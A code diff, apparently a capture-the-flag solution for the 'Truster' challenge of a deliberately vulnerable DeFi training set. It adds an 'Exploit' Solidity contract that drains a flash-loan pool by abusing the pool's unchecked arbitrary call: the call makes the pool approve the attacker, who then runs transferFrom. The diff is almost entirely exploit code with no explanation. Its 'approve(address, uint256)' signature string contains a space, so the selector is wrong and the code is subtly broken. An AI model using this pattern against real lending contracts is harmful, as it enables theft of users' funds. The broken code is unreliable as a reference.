@@ -31,7 +31,7 @@ contract TrusterLenderPool is ReentrancyGuard {
     {
         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
-        
+
         damnValuableToken.transfer(borrower, borrowAmount);
         target.functionCall(data);
 
@@ -39,4 +39,20 @@ contract TrusterLenderPool is ReentrancyGuard {
         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
     }
 
+}
+
+contract Exploit {
+
+  function attack(address _pool, address _token) public {
+
+    TrusterLenderPool pool = TrusterLenderPool(_pool);
+    IERC20 token = IERC20(_token);
+
+    bytes memory data = abi.encodeWithSignature("approve(address, uint256)", address(this), token.balanceOf(_pool));
+
+    pool.flashLoan(0, msg.sender, _token, data);
+
+    token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
+
+  }
 }
